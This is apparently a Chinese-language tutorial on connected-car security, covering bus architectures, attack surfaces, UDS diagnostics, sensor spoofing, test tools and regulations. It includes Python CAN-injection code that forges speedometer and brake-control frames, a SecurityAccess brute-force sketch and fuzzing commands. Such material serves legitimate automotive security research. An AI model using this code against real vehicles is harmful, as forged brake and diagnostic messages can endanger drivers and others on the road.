# 车联网安全

## 智能网联汽车安全概述

现代车辆包含超过 100 个 ECU（电子控制单元），运行超过 1亿行代码。随着 V2X（车路协同）、OTA 更新和自动驾驶技术的普及，车辆攻击面急剧扩大。

## 车辆电子架构

### ECU 网络架构

```yaml
车辆内部网络:
  - CAN 总线（Controller Area Network）:
    - 速度: 125kbps~1Mbps
    - 应用: 动力总成、底盘控制（发动机、制动、转向）
    - 特点: 广播式、无认证、无加密
  - LIN 总线:
    - 速度: 20kbps
    - 应用: 车门、车窗、座椅控制
  - FlexRay:
    - 速度: 10Mbps
    - 应用: 线控驱动（X-by-Wire）
  - MOST (Media Oriented Systems Transport):
    - 应用: 信息娱乐系统
  - Automotive Ethernet:
    - 速度: 100Mbps~1Gbps
    - 应用: ADAS、诊断、OTA（DOIP/SOME/IP）
```

## 攻击面分析

### 远程攻击面

```yaml
远程攻击向量:
  - Telematics (T-Box):
    - 4G/5G 蜂窝网络 → OBD-II 访问 → CAN 总线注入
    - 历史案例: 2015 Jeep Cherokee（Charlie Miller & Chris Valasek）
    - 利用 Sprint 蜂窝网络 → Harman Uconnect 系统 → CAN 总线控制
  - V2X (C-V2X / DSRC):
    - 伪造 V2V 安全消息（假刹车警告、假事故预警）
    - 侧信道攻击 BSM（基本安全消息）
  - OTA 更新:
    - 更新包签名验证绕过
    - 回滚攻击（强制安装旧版有漏洞固件）
  - 移动 App:
    - API 认证绕过 → 远程控车（解锁/启动/定位跟踪）
    - 弱 Token 生成 → 仿冒用户
  - 第三方服务:
    - 充电桩网络（ISO 15118）
    - 停车支付系统
```

### 近场攻击面

```yaml
近场攻击:
  - Bluetooth/BLE:
    - 无钥匙进入系统（PKE）中继攻击
    - BLE 配对绕过
  - NFC/RFID:
    - 数字钥匙克隆（CCC 数字钥匙 2.0 使用 UWB 防中继）
  - Wi-Fi:
    - 信息娱乐系统无线热点
    - OBD-II 蓝牙/Wi-Fi 适配器
  - USB:
    - 媒体文件解析漏洞（MP3/FLAC → 堆溢出）
    - Android Auto/Apple CarPlay 接口
```

### 物理攻击面

```yaml
物理访问攻击:
  - OBD-II 端口:
    - CAN 总线直接注入 ("CAN Injection Attack")
    - ECU 固件读取/改写
  - ECU 调试接口:
    - JTAG/SWD → 固件提取
    - UART 串口 → Shell 访问
  - eMMC/NAND Flash:
    - 芯片飞线 → 数据读取
```

## CAN 总线攻击

### CAN 消息结构

```text
SOF | 11-bit ID | RTR | IDE | r0 | DLC | 0-8 bytes Data | CRC | ACK | EOF
 1      11         1     1    1      4         0-64        15    2     7   (bits)
```

### 攻击技术

```python
# Python CAN 总线注入
import can

# 初始化 CAN 接口
bus = can.interface.Bus(channel='can0', bustype='socketcan')

# 伪造仪表盘速度显示
# 0x3B6 = 仪表盘消息 ID
# 前 2 字节 = 速度值 (km/h)
def set_speed(kmh):
    speed_bytes = int(kmh * 100).to_bytes(2, 'little')
    msg = can.Message(
        arbitration_id=0x3B6,
        data=speed_bytes + b'\x00' * 6,
        is_extended_id=False
    )
    bus.send(msg)
    print(f"Sent speed: {kmh} km/h")

# 伪造制动信号
# 0x127 = 制动控制消息 ID
def send_brake(force_percent):
    data = bytearray(8)
    data[0] = force_percent & 0xFF
    msg = can.Message(arbitration_id=0x127, data=data)
    bus.send(msg)
```

### CAN 模糊测试

```bash
# 使用 ota-cli-toolkit 或 SocketCAN 进行模糊测试
cansend can0 000#0000000000000000  # 发送任意 CAN 帧
# 或使用 ICSim + 自定义模糊器
```

## UDS 诊断协议攻击

UDS（ISO 14229）是车辆诊断的标准协议，通过 OBD-II 端口访问。

```yaml
UDS 安全相关服务:
  - 0x27: SecurityAccess — 种子密钥认证
  - 0x2E: WriteDataByIdentifier — 写入 ECU 数据
  - 0x31: RoutineControl — 执行 ECU 例程
  - 0x34: RequestDownload — 请求固件下载
  - 0x35: RequestUpload — 请求固件上传
```

```python
# UDS 暴力破解 SecurityAccess
def bruteforce_seed_key(session, level=0x01):
    session.send_uds(0x27, [level])  # Request Seed
    seed = session.receive()[2:]      # 获取 4-8 字节种子
    for key in generate_candidate_keys(seed):
        session.send_uds(0x27, [level + 1] + key)
        response = session.receive()
        if response[0] == 0x67:
            return key  # 找到正确密钥
```

## 自动驾驶安全

### ADAS 传感器欺骗

```yaml
传感器攻击:
  - 摄像头:
    - 激光照射导致饱和（白色画面）
    - 对抗性贴纸（使 STOP 标志识别为限速标志）
  - 激光雷达 (LiDAR):
    - 回波欺骗（虚假障碍物）
    - 重放攻击（重放扫描数据）
  - 雷达:
    - 干扰信号（雷达射频干扰）
    - 虚假目标注入
  - GPS:
    - 欺骗（虚假位置坐标）
    - 干扰（信号丢失 → 降级驾驶模式）
  - 超声波:
    - 声波干扰（虚假距离测量）
```

## 车辆安全测试工具

```bash
# 车辆安全工具包
# CANtact/CANtact Pro — USB to CAN 适配器
# ICSim — 仪表盘模拟器
git clone https://github.com/zombieCraig/ICSim
cd ICSim && make

# CaringCaribou — CAN 模糊测试框架
git clone https://github.com/CaringCaribou/caringcaribou
cd caringcaribou && python3 setup.py install
caringcaribou uds --target 0x7DF scan

# Kayak — CAN 分析和逆向工具
# 基于 CANard + Kaitai Struct + Scapy
```

## 法规与合规

```yaml
车联网安全法规:
  - UN R155 (UNECE):
    - 强制 CSMS（网络安全管理体系）
    - OTA 更新类型认证
    - 2024年7月后新车型强制
  - ISO/SAE 21434:
    - 道路车辆网络安全工程
    - 全生命周期风险管理
  - GB/T 40855 (中国):
    - 电动汽车远程服务与管理系统安全
  - NHTSA (美国):
    - 无强制性标准（但有自愿指南）
```

## 总结

车联网安全涉及从芯片到云的完整攻击面。CAN 总线缺乏认证是最根本的安全缺陷，而随着自动驾驶的发展，传感器欺骗攻击将越来越重要。
